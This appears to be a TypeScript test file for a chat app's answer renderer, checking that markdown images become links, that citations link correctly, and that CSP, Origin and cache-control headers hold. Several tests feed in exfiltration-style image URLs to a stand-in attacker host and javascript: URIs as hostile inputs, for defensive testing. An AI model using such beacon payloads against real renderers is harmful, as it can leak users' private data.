import { test } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { Marked } from 'marked';
import { MockLanguageModelV4 } from 'ai/test';
import { answerRenderer, citationHtml, citedNumbers, linkCitations, waitingLabel } from '../public/cite.js';
import { createApp } from '../src/app.js';
import { CSP } from '../src/http/guards.js';

// The same marked setup the browser uses (app.js: marked.use({ renderer: answerRenderer(location.href) })).
const md = new Marked({ renderer: answerRenderer('http://localhost:3000/') as any });
const render = (text: string, sources: { n: number; url: string; title?: string }[] | null = null) =>
  linkCitations(md.parse(text, { async: false }) as string, (n) => citationHtml(n, sources, 'http://localhost:3000/'));

// ---------- 1. images are never loaded ----------

test('a remote markdown image becomes a link with its alt text, never an <img>', () => {
  const html = render('Look: ![chart](https://attacker.example/log?d=secret "t")');
  assert.ok(!/<img/i.test(html), html);
  assert.match(html, /<a class="image-link" href="https:\/\/attacker\.example\/log\?d=secret" title="t" target="_blank" rel="noopener noreferrer">chart<\/a>/);
});

test('reference-style, protocol-relative and http images are links too; unsafe ones are plain text', () => {
  const ref = render('![x][r]\n\n[r]: https://attacker.example/beacon.png');
  assert.ok(!/<img/i.test(ref), ref);
  assert.match(ref, /class="image-link" href="https:\/\/attacker\.example\/beacon\.png"/);
  const rel = render('![y](//attacker.example/a.png) ![z](http://attacker.example/b.png)');
  assert.ok(!/<img/i.test(rel), rel);
  const bad = render('![js](javascript:alert(1)) ![d](data:image/png;base64,AAAA)');
  assert.ok(!/<img|<a /i.test(bad), bad);
  assert.match(bad, /js d/);
});

test('CSP allows no remote images', () => {
  const img = CSP.split('; ').find((d) => d.startsWith('img-src'));
  assert.equal(img, "img-src 'self' data:");
});

// ---------- 2. one citation rule for server and UI ----------

test('[n] inside a link label is neither linked by the UI nor counted by the server', () => {
  const text = 'See [label [8]](https://example.com/b) and [js [9]](javascript:alert(1)), real one [2].';
  const sources = [{ n: 2, url: 'https://two.example' }, { n: 8, url: 'https://eight.example' }, { n: 9, url: 'https://nine.example' }];
  const html = render(text, sources);
  assert.equal((html.match(/class="cite"/g) ?? []).length, 1, html);
  assert.ok(html.includes('href="https://two.example/"'), html);
  assert.ok(!html.includes('javascript:'), html);
  assert.deepEqual([...citedNumbers(text)], [2]);
});

test('a citation with no matching source is shown muted once sources are known, plain while streaming', () => {
  const sources = [{ n: 1, url: 'https://one.example', title: 'One' }];
  const done = render('Price $25 [1], also [7].', sources);
  assert.match(done, /<a class="cite" href="https:\/\/one\.example\/" target="_blank" rel="noopener" title="One">\[1\]<\/a>/);
  assert.match(done, /<span class="cite-missing" title="No source with this number in this answer">\[7\]<\/span>/);
  const streaming = render('Price $25 [1], also [7].', null);
  assert.ok(!streaming.includes('cite'), streaming);
  assert.ok(streaming.includes('[1]') && streaming.includes('[7]'), streaming);
  // A stored answer whose sources were all dropped (none cited) mutes every number.
  assert.match(render('made up [3]', []), /cite-missing[^>]*>\[3\]/);
});

// ---------- 3. phone layout ----------

test('narrow screens get a Menu button that opens the sidebar instead of hiding it for good', () => {
  const htmlFile = readFileSync(new URL('../public/index.html', import.meta.url), 'utf8');
  assert.match(htmlFile, /<aside id="sidebar">/);
  assert.match(htmlFile, /<button type="button" id="menu-toggle" aria-controls="sidebar" aria-expanded="false">Menu<\/button>/);
  assert.match(htmlFile, /<div id="backdrop" hidden><\/div>/);
  const css = readFileSync(new URL('../public/styles.css', import.meta.url), 'utf8');
  assert.ok(!/aside\s*\{\s*display:\s*none/.test(css), 'sidebar must not be display:none on phones');
  assert.match(css, /aside\.open \{ transform: none; visibility: visible; \}/);
  const js = readFileSync(new URL('../public/app.js', import.meta.url), 'utf8');
  assert.match(js, /menuBtn\.setAttribute\('aria-expanded', String\(open\)\)/);
  assert.match(js, /ev\.key === 'Escape'\) closeSidebar\(\)/);
  assert.match(js, /li\.onclick = \(\) => \{\n\s+closeSidebar\(\);/);
});

// ---------- 4. waiting feedback ----------

test('waiting line: nothing under 1.5 s, "Thinking…" after, "Still working" after 15 s', () => {
  assert.equal(waitingLabel(0), null);
  assert.equal(waitingLabel(1500), null);
  assert.equal(waitingLabel(1501), 'Thinking…');
  assert.equal(waitingLabel(15000), 'Thinking…');
  assert.equal(waitingLabel(15001), 'Still working, the model is slow…');
});

// ---------- 5. Origin scheme and API caching ----------

const app = () => createApp({ model: new MockLanguageModelV4({ doStream: [] as any }) });
const post = (origin?: string) =>
  app().request('http://localhost/api/chat', {
    method: 'POST',
    headers: { 'content-type': 'application/json', ...(origin ? { origin } : {}) },
    body: JSON.stringify({ message: '' }),
  });

test('Origin must match scheme and host: https page vs http server is cross-origin', async () => {
  assert.equal((await post('https://localhost')).status, 403);
  assert.equal((await post('http://localhost:9999')).status, 403);
  // Same scheme and host passes the guard and reaches validation (empty message: 400).
  assert.equal((await post('http://localhost')).status, 400);
  assert.equal((await post()).status, 400);
});

test('API responses are no-store; the page is not', async () => {
  const api = await app().request('http://localhost/api/health');
  assert.equal(api.headers.get('cache-control'), 'no-store');
  const page = await app().request('http://localhost/');
  assert.notEqual(page.headers.get('cache-control'), 'no-store');
});
